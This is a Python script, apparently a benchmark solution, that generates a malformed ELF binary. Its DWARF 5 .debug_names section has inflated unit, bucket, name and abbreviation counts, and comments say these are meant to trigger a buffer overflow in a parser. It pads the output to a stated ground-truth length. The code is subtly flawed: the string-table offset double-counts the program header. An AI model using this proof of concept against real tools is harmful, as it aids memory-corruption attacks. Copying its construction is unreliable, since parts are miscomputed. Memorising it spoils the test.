import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF header
        elf_header = bytearray()
        
        # ELF identification
        elf_header.extend(b'\x7fELF')  # ELF magic
        elf_header.append(2)  # 64-bit
        elf_header.append(1)  # Little endian
        elf_header.append(1)  # ELF version
        elf_header.append(0)  # OS ABI (System V)
        elf_header.extend(b'\x00' * 8)  # Padding
        
        # ELF header
        elf_header.extend(struct.pack('<H', 2))  # ET_EXEC
        elf_header.extend(struct.pack('<H', 62))  # EM_X86_64
        elf_header.extend(struct.pack('<I', 1))  # Version
        elf_header.extend(struct.pack('<Q', 0x400000))  # Entry point
        elf_header.extend(struct.pack('<Q', 64))  # Program header offset
        elf_header.extend(struct.pack('<Q', 0))  # Section header offset
        elf_header.extend(struct.pack('<I', 0))  # Flags
        elf_header.extend(struct.pack('<H', 64))  # EH size
        elf_header.extend(struct.pack('<H', 56))  # PH entry size
        elf_header.extend(struct.pack('<H', 1))  # PH count
        elf_header.extend(struct.pack('<H', 64))  # SH entry size
        elf_header.extend(struct.pack('<H', 0))  # SH count
        elf_header.extend(struct.pack('<H', 0))  # SH string table index
        
        # Create program header
        program_header = bytearray()
        program_header.extend(struct.pack('<I', 1))  # PT_LOAD
        program_header.extend(struct.pack('<I', 7))  # Flags (RWX)
        program_header.extend(struct.pack('<Q', 0))  # Offset
        program_header.extend(struct.pack('<Q', 0x400000))  # Virtual address
        program_header.extend(struct.pack('<Q', 0x400000))  # Physical address
        program_header.extend(struct.pack('<Q', 0x1000))  # File size
        program_header.extend(struct.pack('<Q', 0x1000))  # Memory size
        program_header.extend(struct.pack('<Q', 0x1000))  # Alignment
        
        # Create .debug_names section
        debug_names = bytearray()
        
        # DWARF 5 .debug_names header
        # Initial length - use 64-bit format (0xFFFFFFFF followed by 64-bit length)
        debug_names.extend(struct.pack('<I', 0xFFFFFFFF))
        debug_names.extend(struct.pack('<Q', 0x100))  # Length - small value
        
        debug_names.extend(struct.pack('<H', 5))  # Version (DWARF5)
        debug_names.extend(struct.pack('<H', 0))  # Padding
        
        # Set counts to trigger miscalculation
        # The vulnerability is in internal calculations when reading .debug_names
        # We need to create mismatched counts that will cause buffer overflow
        debug_names.extend(struct.pack('<I', 0x1000000))  # Large compilation_unit_count
        debug_names.extend(struct.pack('<I', 0))  # local_type_unit_count
        debug_names.extend(struct.pack('<I', 0))  # foreign_type_unit_count
        
        debug_names.extend(struct.pack('<I', 0x8000000))  # Extremely large bucket_count
        debug_names.extend(struct.pack('<I', 0x4000000))  # Large name_count
        
        # Abbreviation table size - trigger overflow in calculations
        debug_names.extend(struct.pack('<I', 0xFFFFFFF))  # Large but not absurd
        
        # Augmentation string size - small
        debug_names.extend(struct.pack('<I', 0))
        
        # No augmentation string (size is 0)
        
        # Create abbreviation table (minimal)
        # The table will be small but counts suggest large allocation
        abbrev_table = struct.pack('<I', 0)  # Terminator
        
        debug_names.extend(abbrev_table)
        
        # Create bucket array - minimal data but counts suggest large
        # This mismatch will trigger the buffer overflow
        for _ in range(100):
            debug_names.extend(struct.pack('<I', 0))
        
        # Create name table entries - minimal
        for _ in range(50):
            # Each entry: index + offset
            debug_names.extend(struct.pack('<I', 0))
            debug_names.extend(struct.pack('<I', 0))
        
        # Pad to cause overflow when reading
        padding = b'\x41' * 1000  # 'A's
        debug_names.extend(padding)
        
        # Create ELF sections
        sections = bytearray()
        
        # .shstrtab section (section header string table)
        shstrtab = bytearray()
        shstrtab.extend(b'\0')  # Empty string at index 0
        shstrtab.extend(b'.shstrtab\0')
        shstrtab.extend(b'.debug_names\0')
        
        # Align sections
        elf_size = len(elf_header) + len(program_header)
        debug_names_offset = ((elf_size + 0xFFF) & ~0xFFF)
        
        # Create section headers
        section_headers = bytearray()
        
        # Null section header
        section_headers.extend(b'\0' * 64)
        
        # .shstrtab section header
        section_headers.extend(struct.pack('<I', 1))  # sh_name offset to ".shstrtab"
        section_headers.extend(struct.pack('<I', 3))  # SHT_STRTAB
        section_headers.extend(struct.pack('<Q', 0))  # Flags
        section_headers.extend(struct.pack('<Q', 0))  # Address
        section_headers.extend(struct.pack('<Q', elf_size + len(program_header)))  # Offset
        section_headers.extend(struct.pack('<Q', len(shstrtab)))  # Size
        section_headers.extend(struct.pack('<I', 0))  # Link
        section_headers.extend(struct.pack('<I', 0))  # Info
        section_headers.extend(struct.pack('<Q', 1))  # Alignment
        section_headers.extend(struct.pack('<Q', 0))  # Entry size
        
        # .debug_names section header
        section_headers.extend(struct.pack('<I', 11))  # sh_name offset to ".debug_names"
        section_headers.extend(struct.pack('<I', 1))  # SHT_PROGBITS
        section_headers.extend(struct.pack('<Q', 0))  # Flags
        section_headers.extend(struct.pack('<Q', 0))  # Address
        section_headers.extend(struct.pack('<Q', debug_names_offset))  # Offset
        section_headers.extend(struct.pack('<Q', len(debug_names)))  # Size
        section_headers.extend(struct.pack('<I', 0))  # Link
        section_headers.extend(struct.pack('<I', 0))  # Info
        section_headers.extend(struct.pack('<Q', 1))  # Alignment
        section_headers.extend(struct.pack('<Q', 0))  # Entry size
        
        # Build final ELF
        elf = bytearray()
        
        # ELF header
        elf.extend(elf_header)
        
        # Update ELF header with section header info
        elf[40:48] = struct.pack('<Q', debug_names_offset + len(debug_names))  # sh_offset
        elf[60:62] = struct.pack('<H', 3)  # shnum (null + .shstrtab + .debug_names)
        elf[62:64] = struct.pack('<H', 1)  # shstrndx (index of .shstrtab)
        
        # Program header
        elf.extend(program_header)
        
        # .shstrtab
        elf.extend(shstrtab)
        
        # Pad to debug_names_offset
        current_len = len(elf)
        if current_len < debug_names_offset:
            elf.extend(b'\0' * (debug_names_offset - current_len))
        
        # .debug_names section
        elf.extend(debug_names)
        
        # Section headers
        elf.extend(section_headers)
        
        # Ensure we have at least 1551 bytes (ground truth length)
        if len(elf) < 1551:
            elf.extend(b'\0' * (1551 - len(elf)))
        
        return bytes(elf)
